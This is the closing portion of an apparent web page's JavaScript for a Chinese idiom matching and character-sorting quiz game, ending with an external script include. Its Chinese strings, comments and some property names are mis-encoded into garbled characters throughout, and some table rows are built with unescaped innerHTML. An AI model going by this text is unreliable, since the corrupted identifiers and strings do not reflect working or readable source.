    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

        function selectItem(item, side) {
            if (side === 'left') {
                if (selectedLeft) {
                    selectedLeft.classList.remove('selected');
                }
                selectedLeft = item;
            } else {
                if (selectedRight) {
                    selectedRight.classList.remove('selected');
                }
                selectedRight = item;
            }
            item.classList.add('selected');

            if (selectedLeft && selectedRight) {
                checkMatch();
            }
        }

	function stringToArray(str) {
		return Array.from(str.match(/\P{RI}\p{RI}?\p{RI}?/gu) ?? []);
	}

	function getRandomEmoji(emojiString) {
		const emojiArray = stringToArray(emojiString);
		return emojiArray[Math.floor(Math.random() * emojiArray.length)];
	}

	function changeEmoji(isCorrect) {
		const character = document.getElementById('character');
		if (isCorrect) {
			character.textContent = getRandomEmoji(happyEmojis);
			character.classList.add('animated');

			/*
			setTimeout(() => {
				character.textContent = 'ğŸ™‚';
				character.classList.remove('animated');
			}, 2000);
			*/
		} else {
			character.textContent = getRandomEmoji(sadEmojis);
			character.classList.add('animated');
		}
	}



    function checkMatch() {
        const leftText = selectedLeft.textContent;
        const rightText = selectedRight.textContent;
        const correctPair = currentIdioms.find(pair => pair.left === leftText && pair.right === rightText);
		const leftItems = document.querySelectorAll('.left-item');
		const nextButton = document.getElementById('next-button');
		const endButton = document.getElementById('end-button');

        if (correctPair) {
			correctPairs++;
			playAudio(rightAudio);
            
            
			selectedLeft.classList.add('jump');
			setTimeout(() => {
				selectedLeft.classList.remove('jump');
				selectedLeft.style.backgroundColor = '#4CAF50';				
			}, 500);

			selectedRight.classList.add('jump');
			setTimeout(() => {
				selectedRight.classList.remove('jump');
				selectedRight.style.backgroundColor = '#4CAF50';				
			}, 500);

            selectedLeft.style.pointerEvents = 'none';
            selectedRight.style.pointerEvents = 'none';
			selectedLeft.classList.add('correct');
			selectedRight.classList.add('correct');
            selectedLeft = null;
            selectedRight = null;
            changeEmoji(true);

            if (document.querySelectorAll('.left-item:not([style*="pointer-events: none"])').length === 0) {
    			leftItems.forEach(item => {
					item.style.fontFamily = 'BpmfZihiSans-Regular';
					item.style.fontSize = '1.3em';
				});  
				if(currentRound >= totalRounds){
					showEndButton();
					endButton.focus();									
				} else {
					showNextButton();
					showEndButton();
					nextButton.focus();
				}
            }
        } else {
			playAudio(wrongAudio);
			changeEmoji(false);
			updateErrorRecord(selectedLeft.textContent);



			selectedLeft.classList.add('shake');
			selectedLeft.classList.add('selected-wrong');
			selectedLeft.classList.remove('selected');
			setTimeout(() => {
				selectedLeft.classList.remove('shake');	
				selectedLeft.classList.remove('selected-wrong');
				selectedLeft = null;
			}, 500);

			selectedRight.classList.add('shake');
			selectedRight.classList.add('selected-wrong');
			selectedRight.classList.remove('selected');
			setTimeout(() => {
				selectedRight.classList.remove('shake');	
				selectedRight.classList.remove('selected-wrong');
				selectedRight = null;
			}, 500);
		}
		totalPairs++;
    }



function showResult() {
    const endTime = new Date();
    const timeSpent = Math.round((endTime - startTime) / 1000);
    const accuracy = Math.round((correctPairs / totalPairs) * 100);

    document.getElementById('accuracy-progress').style.width = `${accuracy}%`;

    document.getElementById('accuracy').textContent = `âœ¨æ­£ç¢ºï¼š${accuracy}%`;
    document.getElementById('total-rounds').textContent = `ğŸ¡å›åˆï¼š${currentRound}`;
    document.getElementById('time-spent').textContent = `â°åŠªåŠ›ï¼š${timeSpent} ç§’`;
    document.getElementById('selected-category').textContent = `ğŸ“’åˆ†é¡ï¼š${categorySelect.options[categorySelect.selectedIndex].text}`;
    document.getElementById('match-type-result').textContent = `ğŸª§é…å°ï¼š${document.getElementById('match-type-select').options[document.getElementById('match-type-select').selectedIndex].text}`;
    
    const orderSelect = document.getElementById('order-select');
    const orderText = orderSelect.options[orderSelect.selectedIndex].text;
    document.getElementById('order-type-result').textContent = `ğŸ·ï¸é †åºï¼š${orderText}`;

    updateClearRecordsButton();

    document.getElementById('game').style.display = 'none';
    document.getElementById('result').style.display = 'block';
}

document.getElementById('end-button').onclick = function() {
    showResult();
};

document.getElementById('return-to-setup').onclick = function() {
    document.getElementById('result').style.display = 'none';
	initializeCategories();
	resetGame();	
};

        function showNextButton() {
            const nextButton = document.getElementById('next-button');		
            nextButton.classList.add('visible');
        }

        function hideNextButton() {
            const nextButton = document.getElementById('next-button');
			nextButton.blur();
            nextButton.classList.remove('visible');
        }

function getOrderedIdioms() {
    const selectedCategory = categorySelect.value;
    let filteredIdioms;

    if (selectedCategory === 'å¸¸éŒ¯æŒ‘æˆ°') {
        const errorRecords = getErrorRecords();
        filteredIdioms = idioms.filter(idiom => errorRecords.hasOwnProperty(idiom.æˆèª));
        
        if (document.getElementById('order-select').value === 'sequential') {
            filteredIdioms.sort((a, b) => errorRecords[b.æˆèª] - errorRecords[a.æˆèª]);
        }
    } else {
        filteredIdioms = selectedCategory === 'all' ? 
            idioms.slice() : idioms.filter(idiom => idiom.åˆ†é¡ === selectedCategory);
    }

    return filteredIdioms;
}


function updateProgress() {
    const progress = document.getElementById('progress');
    const roundInfo = document.getElementById('round-info');
    progress.style.width = `${(currentRound / totalRounds) * 100}%`;
    roundInfo.textContent = `${currentRound}/${totalRounds}`;
}

function resetGame() {
    currentIndex = 0;
    currentRound = 0;
    orderedIdioms = [];
    correctPairs = 0;
    totalPairs = 0;
    hideEndButton();
    hideNextButton();
    document.getElementById('setup').classList.add('active');
    document.getElementById('setup').style.display = 'block';
    document.getElementById('game').classList.remove('active');
    document.getElementById('game').style.display = 'none';
	
}

function getRandomExample(examples) {
    const exampleArray = examples.split('|');
    return exampleArray[Math.floor(Math.random() * exampleArray.length)].trim();
}

// å‡ºé¡Œ;

function startNewRound() {
    const selectedCategory = categorySelect.value;
    const orderType = document.getElementById('order-select').value;

    const nextButton = document.getElementById('next-button');
    const endButton = document.getElementById('end-button');
    nextButton.blur();
    endButton.blur();

    if (currentIndex === 0 || currentIndex >= orderedIdioms.length) {
        orderedIdioms = getOrderedIdioms();
        if (orderType === 'random' || (selectedCategory === 'å¸¸éŒ¯æŒ‘æˆ°' && orderType === 'sequential')) {
            shuffleArray(orderedIdioms);
        }
        currentIndex = 0;
        // æ ¹æ“šéŠæˆ²æ¨¡å¼è¨­ç½® totalRounds
        if (matchType === 'æˆèª-æ’åº') {
            totalRounds = orderedIdioms.length;  // æ’åºæ¨¡å¼ä¸‹ï¼Œæ¯å€‹æˆèªéƒ½æ˜¯ä¸€å€‹å›åˆ
        } else {
            totalRounds = Math.ceil(orderedIdioms.length / idiomsPerRound);
        }
        
        currentRound = 0;
    }

    currentRound++;
    updateProgress();

    if (matchType === 'æˆèª-æ’åº') {
        const idiom = orderedIdioms[currentIndex];
        setupSortingGame(idiom);
        currentIndex++;
    } else {
        // é¡¯ç¤ºå·¦å³é…å°å®¹å™¨ï¼Œéš±è—æ’åºå®¹å™¨
        document.getElementById('left-right-container').style.display = 'block';
        document.getElementById('sorting-container').style.display = 'none';
        currentIdioms = [];
        for (let i = 0; i < idiomsPerRound && currentIndex < orderedIdioms.length; i++) {
            const idiom = orderedIdioms[currentIndex];
            let pair;
            switch (matchType) {
                case 'æˆèª-è¡¨é”æ„æ€':
                    pair = { left: idiom.æˆèª, right: idiom.è¡¨é”æ„æ€ };
                    break;
                case 'æˆèª-å­—é¢æ„æ€':
                    pair = { left: idiom.æˆèª, right: idiom.å­—é¢æ„æ€ };
                    break;
                case 'æˆèª-ä¾‹å¥':
                    const randomExample = getRandomExample(idiom.ä¾‹å¥);
                    const maskedSentence = randomExample.replace(idiom.idiomNoBPM, 'ğŸ™ˆ');
                    pair = { left: idiom.æˆèª, right: maskedSentence };
                    break;
            }
            currentIdioms.push(pair);
            currentIndex++;
        }

        const leftContainer = document.getElementById('leftContainer');
        const rightContainer = document.getElementById('rightContainer');

        leftContainer.innerHTML = '';
        rightContainer.innerHTML = '';

        // å‰µå»ºå·¦å´é¸é …
        const leftItems = currentIdioms.map(pair => pair.left);

        leftItems.forEach(item => {
            const leftElement = document.createElement('div');
            leftElement.className = 'left-item';
            leftElement.style.fontFamily = currentFont;
            leftElement.style.fontSize = currentFontSize;        
            leftElement.textContent = item;
            leftElement.onclick = () => selectItem(leftElement, 'left');
            leftContainer.appendChild(leftElement);
        });

        // å‰µå»ºå³å´é¸é …ï¼ˆå§‹çµ‚éš¨æ©Ÿæ’åºï¼‰
        const rightItems = currentIdioms.map(pair => pair.right);
        shuffleArray(rightItems);
        rightItems.forEach(item => {
            const rightElement = document.createElement('div');
            rightElement.className = 'right-item';
            rightElement.textContent = item;
            rightElement.onclick = () => selectItem(rightElement, 'right');
            rightContainer.appendChild(rightElement);
        });
    }

    if (currentRound === 1) {
        startTime = new Date();
    }
}



function setupSortingGame(idiom) {
    const pinyinArray = getPinyinArray(idiom.æ‹¼éŸ³);
    const correctChars = Array.from(idiom.idiomNoBPM);
    const wrongChars = pinyinArray.map(pinyin => 
        getRandomCharForPinyin(pinyin, correctChars)
    ).filter(char => char); // éæ¿¾æ‰å¯èƒ½çš„ undefined

	//here

    const allChars = [...correctChars, ...wrongChars];
    shuffleArray(allChars);

    // éš±è—å·¦å³é…å°å®¹å™¨ï¼Œé¡¯ç¤ºæ’åºå®¹å™¨
    document.getElementById('left-right-container').style.display = 'none';
    document.getElementById('sorting-container').style.display = 'block';

    // æ›´æ–°æˆèªå•é¡Œ
    const idiomQuestion = document.getElementById('idiom-question');
    idiomQuestion.textContent = idiom.æˆèª;
    idiomQuestion.style.fontFamily = 'BpmfZihiOnly-R';
    idiomQuestion.style.fontSize = '3em';

    // æ¸…ç©ºä¸¦å¡«å……ç­”æ¡ˆå€å’Œé¸é …å€
    const answerArea = document.getElementById('answer-area');
    const characterOptions = document.getElementById('character-options');
    answerArea.innerHTML = '';
    characterOptions.innerHTML = '';

    allChars.forEach(char => {
        const charElement = document.createElement('div');
        charElement.className = 'character-option';
        charElement.textContent = char;
        characterOptions.appendChild(charElement);
    });

    setupClickHandlers();

    // é‡æ–°ç¶å®šç¢ºå®šæŒ‰éˆ•çš„äº‹ä»¶
    const checkButton = document.getElementById('check-answer');
    checkButton.onclick = () => checkSortingAnswer(idiom);
    checkButton.disabled = true; // åˆå§‹æ™‚ç¦ç”¨ç¢ºå®šæŒ‰éˆ•
}

function setupClickHandlers() {
    const answerArea = document.getElementById('answer-area');
    const characterOptions = document.getElementById('character-options');
    
    // ç§»é™¤èˆŠçš„äº‹ä»¶ç›£è½å™¨
    characterOptions.removeEventListener('click', handleCharacterOptionClick);
    answerArea.removeEventListener('click', handleAnswerAreaClick);

    // ä½¿ç”¨äº‹ä»¶å§”æ´¾
    characterOptions.addEventListener('click', handleCharacterOptionClick);
    answerArea.addEventListener('click', handleAnswerAreaClick);
}

function handleCharacterOptionClick(e) {
    if (e.target.classList.contains('character-option')) {
        const charElement = e.target.cloneNode(true);
        charElement.classList.add('in-answer');
        document.getElementById('answer-area').appendChild(charElement);
        e.target.style.display = 'none';
		updateCheckButtonState();
    }
}

function handleAnswerAreaClick(e) {
    if (e.target.classList.contains('in-answer')) {
        const char = e.target.textContent;
        const originalOption = Array.from(document.getElementById('character-options').children)
            .find(el => el.textContent === char && el.style.display === 'none');
        if (originalOption) {
            originalOption.style.display = '';
        }
        e.target.remove();
		updateCheckButtonState();
    }
}

function updateCheckButtonState() {
    const answerArea = document.getElementById('answer-area');
    const checkButton = document.getElementById('check-answer');
    const currentIdiom = orderedIdioms[currentIndex - 1];
    checkButton.disabled = answerArea.children.length !== currentIdiom.idiomNoBPM.length;
}
	

function checkSortingAnswer(idiom) {
    const answerArea = document.getElementById('answer-area');
    const characterOptions = document.getElementById('character-options');
    const checkButton = document.getElementById('check-answer');
    const userAnswer = Array.from(answerArea.children).map(el => el.textContent).join('');
    const nextButton = document.getElementById('next-button');
    const endButton = document.getElementById('end-button');

    if (userAnswer === idiom.idiomNoBPM) {
        // ç­”æ¡ˆæ­£ç¢º
        answerArea.classList.add('jump');
        setTimeout(() => {
            answerArea.classList.remove('jump');
        }, 500);
        playAudio(rightAudio);
        changeEmoji(true);
        correctPairs++;
        if (currentRound >= totalRounds) {
            showEndButton();
            endButton.focus();                                  
        } else {
            showNextButton();
            showEndButton();
            nextButton.focus();
        }
        checkButton.disabled = true; // ç¦ç”¨ç¢ºå®šæŒ‰éˆ•ï¼Œé˜²æ­¢é‡è¤‡é»æ“Š
    } else {
        // ç­”æ¡ˆéŒ¯èª¤
        playAudio(wrongAudio);
        changeEmoji(false);
        updateErrorRecord(idiom.æˆèª);
		answerArea.classList.add('shake');

		setTimeout(() => {
			answerArea.classList.remove('shake');
			// å°‡ç­”æ¡ˆå€çš„å…ƒç´ ä¾åºç§»å›é¸é …å€
			const answerElements = Array.from(answerArea.children);
			answerElements.forEach(char => {
				// æ‰¾åˆ°å°æ‡‰çš„åŸå§‹é¸é …
				const originalOption = Array.from(characterOptions.children)
					.find(el => el.textContent === char.textContent && el.style.display === 'none');
				
				if (originalOption) {
					// å¦‚æœæ‰¾åˆ°åŸå§‹é¸é …ï¼Œå‰‡æ¢å¾©å…¶é¡¯ç¤º
					originalOption.style.display = '';
				} else {
					// å¦‚æœæ²’æ‰¾åˆ°åŸå§‹é¸é …ï¼ˆä¸æ‡‰è©²ç™¼ç”Ÿï¼‰ï¼Œå‰‡å‰µå»ºä¸€å€‹æ–°çš„
					const newOption = char.cloneNode(true);
					newOption.classList.remove('in-answer');
					newOption.classList.add('character-option');
					characterOptions.appendChild(newOption);
				}
				
				// ç§»é™¤ç­”æ¡ˆå€çš„å…ƒç´ 
				char.remove();
			});
		}, 1000);
        
        checkButton.disabled = true; // é‡ç½®å¾Œç¦ç”¨ç¢ºå®šæŒ‰éˆ•
    }
    totalPairs++;
}

        document.getElementById('next-button').onclick = function() {
            hideNextButton();
			hideEndButton();
            startNewRound();
        };

document.getElementById('start-button').onclick = function() {
    matchType = document.getElementById('match-type-select').value;
    document.getElementById('setup').classList.remove('active');
    document.getElementById('setup').style.display = 'none';
    document.getElementById('game').classList.add('active');
    document.getElementById('game').style.display = 'block';

    currentIndex = 0;
    currentRound = 0;
    orderedIdioms = [];
    startNewRound();
};

document.getElementById('close-button').onclick = function() {
    resetGame();	
};



document.getElementById('view-idioms-button').onclick = function() {
	currentFont = 'BpmfZihiSans-Regular';
	currentFontState = 'zih';
	currentFontSize = '1.3em';
    const fontToggleButton = document.getElementById('font-toggle-button');
	const ListfontToggleButton = document.getElementById('list-font-toggle-button');
	fontToggleButton.textContent = 'å­—';
	ListfontToggleButton.textContent = 'å­—';
    document.getElementById('setup').style.display = 'none';
    document.getElementById('idiom-list').style.display = 'block';
    renderIdiomList(); 
};

document.getElementById('close-idiom-list').onclick = function() {
    document.getElementById('idiom-list').style.display = 'none';
    document.getElementById('setup').style.display = 'block';
};



function replaceIdiomWithUnderscore(sentence, idiom) {
    return sentence.replace(new RegExp(idiom, 'g'), 'ğŸ™ˆ');
}

function renderIdiomList() {
    const selectedCategory = document.getElementById('category-select').value;
    const table = document.getElementById('idiom-table');
    const tbody = table.querySelector('tbody');
    tbody.innerHTML = '';

    // ç¯©é¸æˆèª
    let filteredIdioms;
    if (selectedCategory === 'å¸¸éŒ¯æŒ‘æˆ°') {
        const errorRecords = getErrorRecords();
        filteredIdioms = idioms.filter(idiom => errorRecords.hasOwnProperty(idiom.æˆèª));
        filteredIdioms.sort((a, b) => errorRecords[b.æˆèª] - errorRecords[a.æˆèª]);
    } else {
        filteredIdioms = selectedCategory === 'all' 
            ? idioms 
            : idioms.filter(idiom => idiom.åˆ†é¡ === selectedCategory);
    }

    filteredIdioms.forEach((idiom, index) => {
        const randomExample = getRandomExample(idiom.ä¾‹å¥);
        const row = document.createElement('tr');
        row.innerHTML = `
            <td class="category"><small>${idiom.åˆ†é¡}</small></td>
            <td><small class="small-number">${index + 1} </small><span class="idiom">${idiom.æˆèª}</span></td>
            <td class="literal">${idiom.å­—é¢æ„æ€}</td>
            <td class="figurative">${idiom.è¡¨é”æ„æ€}</td>
            <td class="example">${replaceIdiomWithUnderscore(randomExample, idiom.idiomNoBPM)}</td>
        `;
        tbody.appendChild(row);
    });

	const idiomList = document.querySelectorAll('.idiom');
    idiomList.forEach(item => {
		item.style.fontFamily = currentFont;
    });

    updateVisibility();
    updateCategoryNavigation();
}

function updateVisibility() {
    const showCategory = document.getElementById('show-category').checked;
    const showIdiom = document.getElementById('show-idiom').checked;
    const showLiteral = document.getElementById('show-literal').checked;
    const showFigurative = document.getElementById('show-figurative').checked;
    const showExample = document.getElementById('show-example').checked;

    document.querySelectorAll('#idiom-table .category').forEach(el => el.style.display = showCategory ? '' : 'none');
    document.querySelectorAll('#idiom-table .idiom').forEach(el => el.style.display = showIdiom ? '' : 'none');
    document.querySelectorAll('#idiom-table .literal').forEach(el => el.style.display = showLiteral ? '' : 'none');
    document.querySelectorAll('#idiom-table .figurative').forEach(el => el.style.display = showFigurative ? '' : 'none');
    document.querySelectorAll('#idiom-table .example').forEach(el => el.style.display = showExample ? '' : 'none');
}

document.querySelectorAll('.idiom-controls input[type="checkbox"]').forEach(checkbox => {
    checkbox.addEventListener('change', updateVisibility);
});

document.getElementById('category-select').addEventListener('change', function() {
    renderIdiomList();
    updateCategoryNavigation();
});

function updateCategoryNavigation() {
    const categorySelect = document.getElementById('category-select');
    const prevButton = document.getElementById('prev-category');
    const nextButton = document.getElementById('next-category');
    const categories = Array.from(categorySelect.options).map(option => option.value);
    currentCategoryIndex = categories.indexOf(categorySelect.value);

    prevButton.disabled = currentCategoryIndex <= 1;  // ç¦ç”¨"å…¨éƒ¨"çš„ä¸Šä¸€å€‹
    nextButton.disabled = currentCategoryIndex >= categories.length - 1;

    if (currentCategoryIndex > 0) {
        prevButton.textContent = "< "  + categories[currentCategoryIndex - 1];
    }
    if (currentCategoryIndex < categories.length - 1) {
        nextButton.textContent = categories[currentCategoryIndex + 1] + " >";
    }
}

function changeCategory(direction) {
    const categorySelect = document.getElementById('category-select');
    const categories = Array.from(categorySelect.options).map(option => option.value);
    
    currentCategoryIndex += direction;
    if (currentCategoryIndex < 1) currentCategoryIndex = 1;  // ä¸è¦é¸åˆ°"å…¨éƒ¨"
    if (currentCategoryIndex >= categories.length) currentCategoryIndex = categories.length - 1;

    categorySelect.value = categories[currentCategoryIndex];
    renderIdiomList();
    updateCategoryNavigation();
}

document.getElementById('prev-category').onclick = () => changeCategory(-1);
document.getElementById('next-category').onclick = () => changeCategory(1);

updateCategoryNavigation();

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('font-toggle-button').addEventListener('click', toggleFont);
	document.getElementById('list-font-toggle-button').addEventListener('click', toggleFont);	
});

document.getElementById('clear-records').onclick = function() {
    if (confirm('ç¢ºå®šè¦æ¸…é™¤æ‰€æœ‰éŒ¯èª¤è¨˜éŒ„å—ï¼Ÿ')) {
        clearErrorRecords();
        alert('éŒ¯èª¤è¨˜éŒ„å·²æ¸…é™¤');        
        // æ¸…é™¤è¨˜éŒ„å¾Œï¼Œéœ€è¦æ›´æ–°é¡åˆ¥åˆ—è¡¨ï¼Œç§»é™¤ã€Œå¸¸éŒ¯æŒ‘æˆ°ã€é¸é …
        initializeCategories();
        
        // å¦‚æœç•¶å‰åœ¨ã€Œå¸¸éŒ¯æŒ‘æˆ°ã€é¡åˆ¥ï¼Œå‰‡åˆ‡æ›åˆ°ã€Œæ‰€æœ‰åˆ†é¡ã€
        if (categorySelect.value === 'å¸¸éŒ¯æŒ‘æˆ°') {
            categorySelect.value = 'all';
        }        
        // æ›´æ–°é¡åˆ¥å°èˆªæŒ‰éˆ•
        updateCategoryNavigation();
        // æ›´æ–°æ¸…é™¤ç´€éŒ„æŒ‰éˆ•ç‹€æ…‹
        updateClearRecordsButton();
    }
};

function initializeCategories() {
    const categories = ['all', ...new Set(idioms.map(idiom => idiom.åˆ†é¡))];
    const categorySelect = document.getElementById('category-select');
    categorySelect.innerHTML = '';

    categories.forEach(category => {
        const option = document.createElement('option');
        option.value = category === 'all' ? 'all' : category;
        option.textContent = category === 'all' ? 'æ‰€æœ‰åˆ†é¡' : category;
        categorySelect.appendChild(option);
    });

    const errorRecords = getErrorRecords();
    if (Object.keys(errorRecords).length > 0) {
        const errorOption = document.createElement('option');
        errorOption.value = 'å¸¸éŒ¯æŒ‘æˆ°';
        errorOption.textContent = 'å¸¸éŒ¯æŒ‘æˆ°';
        categorySelect.appendChild(errorOption);
    }
}

function updateClearRecordsButton() {
    const clearRecordsButton = document.getElementById('clear-records');
    const errorRecords = getErrorRecords();
    const hasErrors = Object.keys(errorRecords).length > 0;
    
    clearRecordsButton.disabled = !hasErrors;
    clearRecordsButton.style.opacity = hasErrors ? '1' : '0.5';
    clearRecordsButton.style.cursor = hasErrors ? 'pointer' : 'not-allowed';
}

// åœ¨é é¢è¼‰å…¥æ™‚èª¿ç”¨æ­¤å‡½æ•¸
document.addEventListener('DOMContentLoaded', initializeCategories);

    </script>
<script src="https://y.yay.boo/y.js"></script>
</body>
</html>
